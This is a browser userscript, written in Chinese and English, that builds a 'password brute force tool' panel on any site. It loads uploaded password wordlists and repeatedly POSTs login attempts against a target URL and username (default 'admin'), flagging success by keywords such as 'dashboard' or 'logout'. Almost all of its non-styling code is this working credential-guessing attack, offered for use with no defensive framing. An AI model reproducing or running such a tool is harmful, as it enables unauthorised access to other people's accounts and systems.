// ==UserScript==
// @name         密码破解器
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Visual password brute force tool with real-time monitoring
// @author       こんにちは🔷(病毒小鬼)
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @grant        GM_addStyle
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_registerMenuCommand
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    // 配置
    let config = {
        attackRunning: false,
        currentAttack: null,
        passwordLists: [],
        attackStats: {
            totalAttempts: 0,
            successful: 0,
            failed: 0,
            averageSpeed: 0,
            startTime: null,
            elapsedTime: 0
        }
    };

    // 加载保存的配置
    const savedConfig = GM_getValue('bruteForceConfig');
    if (savedConfig) {
        config = { ...config, ...savedConfig };
    }

    // 添加样式
    GM_addStyle(`
        #bruteForcePanel {
            position: fixed;
            top: 50px;
            right: 50px;
            width: 800px;
            height: 600px;
            background: #1a1a1a;
            border: 2px solid #ff4757;
            border-radius: 10px;
            z-index: 10000;
            box-shadow: 0 0 30px rgba(255, 71, 87, 0.3);
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .panel-header {
            background: linear-gradient(135deg, #ff4757, #ff6b81);
            padding: 15px;
            color: white;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: move;
        }

        .panel-title {
            font-size: 18px;
            font-weight: bold;
        }

        .panel-controls {
            display: flex;
            gap: 10px;
        }

        .panel-btn {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            color: white;
            width: 30px;
            height: 30px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.3s;
        }

        .panel-btn:hover {
            background: rgba(255, 255, 255, 0.3);
        }

        .panel-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .input-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .input-label {
            color: #ffa502;
            font-weight: bold;
            font-size: 14px;
        }

        .input-field {
            background: #2d2d2d;
            border: 1px solid #444;
            border-radius: 5px;
            padding: 12px;
            color: white;
            font-family: 'Courier New', monospace;
        }

        .input-field:focus {
            outline: none;
            border-color: #ffa502;
        }

        .btn {
            padding: 12px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
            font-family: 'Courier New', monospace;
        }

        .btn-primary {
            background: linear-gradient(135deg, #2ed573, #1e90ff);
            color: white;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(46, 213, 115, 0.3);
        }

        .btn-danger {
            background: linear-gradient(135deg, #ff4757, #ff6b81);
            color: white;
        }

        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.3);
        }

        .btn-success {
            background: linear-gradient(135deg, #2ed573, #27ae60);
            color: white;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin: 15px 0;
        }

        .stat-card {
            background: #2d2d2d;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
            border-left: 4px solid #ffa502;
        }

        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #ffa502;
            margin: 5px 0;
        }

        .stat-label {
            font-size: 12px;
            color: #aaa;
        }

        .progress-container {
            width: 100%;
            height: 20px;
            background: #2d2d2d;
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #ffa502, #ff4757);
            transition: width 0.3s ease;
            position: relative;
        }

        .progress-text {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: white;
            font-weight: bold;
            font-size: 12px;
        }

        .log-container {
            flex: 1;
            background: #2d2d2d;
            border-radius: 8px;
            padding: 15px;
            overflow-y: auto;
            max-height: 200px;
            font-size: 12px;
        }

        .log-entry {
            padding: 8px;
            margin-bottom: 5px;
            border-radius: 4px;
            border-left: 3px solid #444;
        }

        .log-success {
            background: rgba(46, 213, 115, 0.1);
            border-left-color: #2ed573;
            color: #2ed573;
        }

        .log-error {
            background: rgba(255, 71, 87, 0.1);
            border-left-color: #ff4757;
            color: #ff4757;
        }

        .log-info {
            background: rgba(30, 144, 255, 0.1);
            border-left-color: #1e90ff;
            color: #1e90ff;
        }

        .log-warning {
            background: rgba(255, 165, 2, 0.1);
            border-left-color: #ffa502;
            color: #ffa502;
        }

        .password-list {
            max-height: 150px;
            overflow-y: auto;
            background: #2d2d2d;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
        }

        .password-item {
            padding: 5px;
            margin: 2px 0;
            background: #3d3d3d;
            border-radius: 3px;
            font-size: 11px;
            color: #ccc;
        }

        .file-upload {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .file-input {
            display: none;
        }

        .file-label {
            padding: 10px 15px;
            background: #3d3d3d;
            border-radius: 5px;
            cursor: pointer;
            color: #ccc;
            font-size: 12px;
            transition: background 0.3s;
        }

        .file-label:hover {
            background: #4d4d4d;
        }

        .attack-controls {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 15px 0;
        }
    `);

    // 创建UI
    function createUI() {
        const panel = document.createElement('div');
        panel.id = 'bruteForcePanel';
        panel.innerHTML = `
            <div class="panel-header">
                <div class="panel-title">🔓 密码暴力破解工具</div>
                <div class="panel-controls">
                    <button class="panel-btn" id="minimizeBtn">−</button>
                    <button class="panel-btn" id="closeBtn">×</button>
                </div>
            </div>

            <div class="panel-content">
                <div class="input-group">
                    <label class="input-label">🎯 目标网址</label>
                    <input type="text" class="input-field" id="targetUrl" placeholder="https://example.com/login" value="${window.location.origin}/login">
                </div>

                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                    <div class="input-group">
                        <label class="input-label">👤 用户名字段</label>
                        <input type="text" class="input-field" id="usernameField" value="username" placeholder="username">
                    </div>
                    <div class="input-group">
                        <label class="input-label">🔑 密码字段</label>
                        <input type="text" class="input-field" id="passwordField" value="password" placeholder="password">
                    </div>
                </div>

                <div class="input-group">
                    <label class="input-label">🆔 目标用户名</label>
                    <input type="text" class="input-field" id="targetUsername" placeholder="admin" value="admin">
                </div>

                <div class="input-group">
                    <label class="input-label">📁 密码列表 / 密码字典</label>
                    <div class="file-upload">
                        <input type="file" class="file-input" id="passwordFile" accept=".txt" multiple>
                        <label for="passwordFile" class="file-label">📤上传密码文件</label>
                        <span id="fileCount">0 files loaded</span>
                    </div>
                    <div class="password-list" id="passwordListContainer">
                        ${config.passwordLists.map(list => `
                            <div class="password-item">${list.name} (${list.passwords.length} passwords)</div>
                        `).join('')}
                    </div>
                </div>

                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value" id="totalAttempts">${config.attackStats.totalAttempts}</div>
                        <div class="stat-label">Total Attempts</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="successfulAttempts">${config.attackStats.successful}</div>
                        <div class="stat-label">Successful</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="failedAttempts">${config.attackStats.failed}</div>
                        <div class="stat-label">Failed</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="speedValue">${config.attackStats.averageSpeed}/s</div>
                        <div class="stat-label">Speed</div>
                    </div>
                </div>

                <div class="progress-container">
                    <div class="progress-bar" id="progressBar" style="width: 0%">
                        <div class="progress-text" id="progressText">0%</div>
                    </div>
                </div>

                <div class="attack-controls">
                    <button class="btn btn-primary" id="startAttack">🚀 开始攻击该用户</button>
                    <button class="btn btn-danger" id="stopAttack" style="display: none;">⏹️ 清除日志</button>
                    <button class="btn btn-success" id="clearStats">🔄 Clear Stats</button>
                </div>

                <div class="input-group">
                    <label class="input-label">📊 攻击日志 / 操作日志</label>
                    <div class="log-container" id="attackLog">
                        <div class="log-entry log-info">Ready to start attack...</div>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(panel);
        setupEventListeners();
        setupDragAndDrop();
    }

    // 设置事件监听器
    function setupEventListeners() {
        // 文件上传
        document.getElementById('passwordFile').addEventListener('change', handleFileUpload);

        // 攻击控制
        document.getElementById('startAttack').addEventListener('click', startAttack);
        document.getElementById('stopAttack').addEventListener('click', stopAttack);
        document.getElementById('clearStats').addEventListener('click', clearStats);

        // 面板控制
        document.getElementById('minimizeBtn').addEventListener('click', minimizePanel);
        document.getElementById('closeBtn').addEventListener('click', closePanel);
    }

    // 处理文件上传
    async function handleFileUpload(event) {
        const files = event.target.files;
        if (!files.length) return;

        for (const file of files) {
            try {
                const content = await readFile(file);
                const passwords = content.split('\n')
                    .map(line => line.trim())
                    .filter(line => line.length > 0 && !line.startsWith('#'));

                config.passwordLists.push({
                    name: file.name,
                    passwords: passwords,
                    size: passwords.length
                });

                addLog(`📁 Loaded: ${file.name} (${passwords.length} passwords)`, 'info');
            } catch (error) {
                addLog(`❌ 读取错误 / 读取失败 ${file.name}: ${error.message}`, 'error');
            }
        }

        updateFileCount();
        updatePasswordList();
        saveConfig();
    }

    // 读取文件内容
    function readFile(file) {
        return new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onload = e => resolve(e.target.result);
            reader.onerror = e => reject(e);
            reader.readAsText(file);
        });
    }

    // 开始攻击
    function startAttack() {
        if (config.attackRunning) return;

        const targetUrl = document.getElementById('targetUrl').value;
        const usernameField = document.getElementById('usernameField').value;
        const passwordField = document.getElementById('passwordField').value;
        const username = document.getElementById('targetUsername').value;

        // 验证输入
        if (!targetUrl || !usernameField || !passwordField || !username) {
            addLog('❌请填写所有必填项', '错误');
            return;
        }

        if (config.passwordLists.length === 0) {
            addLog('❌ 未加载任何密码文件', '错误');
            return;
        }

        // 合并所有密码
        const allPasswords = config.passwordLists.flatMap(list => list.passwords);
        const totalPasswords = allPasswords.length;

        if (totalPasswords === 0) {
            addLog('❌ 已加载的文件中没有密码', '错误');
            return;
        }

        config.attackRunning = true;
        config.attackStats.startTime = Date.now();
        config.attackStats.elapsedTime = 0;

        // 更新UI
        document.getElementById('startAttack').style.display = 'none';
        document.getElementById('stopAttack').style.display = 'inline-block';

        addLog(`🚀 Starting attack with ${totalPasswords} passwords...`, 'info');

        // 开始攻击循环
        let currentIndex = 0;
        let successful = 0;
        let failed = 0;
        let startTime = Date.now();

        const attackInterval = setInterval(async () => {
            if (!config.attackRunning || currentIndex >= totalPasswords) {
                clearInterval(attackInterval);
                finishAttack();
                return;
            }

            const password = allPasswords[currentIndex];
            currentIndex++;

            try {
                const success = await attemptLogin(targetUrl, usernameField, passwordField, username, password);

                if (success) {
                    successful++;
                    addLog(`🎉 SUCCESS! Username: ${username}, Password: ${password}`, 'success');

                    // 发现密码后自动停止
                    config.attackRunning = false;
                    clearInterval(attackInterval);
                    finishAttack();
                    return;
                } else {
                    failed++;
                    addLog(`❌ Failed: ${password}`, 'error');
                }
            } catch (error) {
                failed++;
                addLog(`⚠️ Error: ${password} - ${error.message}`, 'warning');
            }

            // 更新统计信息
            const elapsed = (Date.now() - startTime) / 1000;
            const speed = Math.round((currentIndex / elapsed) * 100) / 100;

            config.attackStats = {
                totalAttempts: currentIndex,
                successful: successful,
                failed: failed,
                averageSpeed: speed,
                elapsedTime: elapsed
            };

            // 更新UI
            updateStats();
            updateProgress(currentIndex, totalPasswords);

        }, 1000); // 每秒尝试一次

        // 保存攻击状态
        config.currentAttack = {
            intervalId: attackInterval,
            startTime: startTime,
            totalPasswords: totalPasswords,
            currentIndex: currentIndex
        };

        saveConfig();
    }

    // 尝试登录
    async function attemptLogin(url, usernameField, passwordField, username, password) {
        // 创建表单数据
        const formData = new FormData();
        formData.append(usernameField, username);
        formData.append(passwordField, password);

        try {
            const response = await fetch(url, {
                method: 'POST',
                body: formData,
                credentials: 'include',
                headers: {
                    'X-Requested-With': 'XMLHttpRequest'
                }
            });

            // 检查响应 - 这里需要根据目标网站调整
            const responseText = await response.text();

            // 简单的成功检测逻辑（需要根据具体网站调整）
            const successIndicators = [
                'dashboard', 'welcome', 'success', 'logout', 'profile',
                'location.href', 'window.location', '302 Found'
            ];

            return successIndicators.some(indicator =>
                responseText.toLowerCase().includes(indicator.toLowerCase()) ||
                response.url.toLowerCase().includes(indicator.toLowerCase())
            );

        } catch (error) {
            throw new Error('Network error');
        }
    }

    // 停止攻击
    function stopAttack() {
        if (config.currentAttack) {
            clearInterval(config.currentAttack.intervalId);
        }
        config.attackRunning = false;
        finishAttack();
        addLog('⏹️ Attack stopped by user', 'info');
    }

    // 完成攻击
    function finishAttack() {
        config.attackRunning = false;
        config.currentAttack = null;

        // 更新UI
        document.getElementById('startAttack').style.display = 'inline-block';
        document.getElementById('stopAttack').style.display = 'none';

        addLog('✅ Attack completed', 'info');
        saveConfig();
    }

    // 清除统计信息
    function clearStats() {
        config.attackStats = {
            totalAttempts: 0,
            successful: 0,
            failed: 0,
            averageSpeed: 0,
            elapsedTime: 0
        };
        config.passwordLists = [];

        updateStats();
        updateProgress(0, 100);
        updateFileCount();
        updatePasswordList();

        document.getElementById('attackLog').innerHTML = '<div class="log-entry log-info">📊 Log cleared</div>';

        saveConfig();
        addLog('🔄 Statistics cleared', 'info');
    }

    // 更新统计信息
    function updateStats() {
        document.getElementById('totalAttempts').textContent = config.attackStats.totalAttempts;
        document.getElementById('successfulAttempts').textContent = config.attackStats.successful;
        document.getElementById('failedAttempts').textContent = config.attackStats.failed;
        document.getElementById('speedValue').textContent = `${config.attackStats.averageSpeed}/s`;
    }

    // 更新进度条
    function updateProgress(current, total) {
        const percentage = total > 0 ? (current / total) * 100 : 0;
        document.getElementById('progressBar').style.width = `${percentage}%`;
        document.getElementById('progressText').textContent = `${Math.round(percentage)}%`;
    }

    // 更新文件计数
    function updateFileCount() {
        const totalFiles = config.passwordLists.length;
        const totalPasswords = config.passwordLists.reduce((sum, list) => sum + list.passwords.length, 0);
        document.getElementById('fileCount').textContent = `${totalFiles} files (${totalPasswords} passwords)`;
    }

    // 更新密码列表显示
    function updatePasswordList() {
        const container = document.getElementById('passwordListContainer');
        container.innerHTML = config.passwordLists.map(list => `
            <div class="password-item">${list.name} (${list.passwords.length} passwords)</div>
        `).join('');
    }

    // 添加日志
    function addLog(message, type = 'info') {
        const logContainer = document.getElementById('attackLog');
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry log-${type}`;
        logEntry.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;

        logContainer.appendChild(logEntry);
        logContainer.scrollTop = logContainer.scrollHeight;
    }

    // 保存配置
    function saveConfig() {
        GM_setValue('bruteForceConfig', config);
    }

    // 面板控制函数
    function setupDragAndDrop() {
        const panel = document.getElementById('bruteForcePanel');
        const header = document.querySelector('.panel-header');

        let isDragging = false;
        let offsetX, offsetY;

        header.addEventListener('mousedown', (e) => {
            isDragging = true;
            offsetX = e.clientX - panel.offsetLeft;
            offsetY = e.clientY - panel.offsetTop;
        });

        document.addEventListener('mousemove', (e) => {
            if (!isDragging) return;
            panel.style.left = `${e.clientX - offsetX}px`;
            panel.style.top = `${e.clientY - offsetY}px`;
        });

        document.addEventListener('mouseup', () => {
            isDragging = false;
        });
    }

    function minimizePanel() {
        const panel = document.getElementById('bruteForcePanel');
        panel.style.display = panel.style.display === 'none' ? 'flex' : 'none';
    }

    function closePanel() {
        const panel = document.getElementById('bruteForcePanel');
        panel.remove();
    }

    // 注册菜单命令
    GM_registerMenuCommand('Show Password Brute Force Tool', createUI);

    // 初始化
    if (GM_getValue('autoShowPanel', false)) {
        createUI();
    }

})();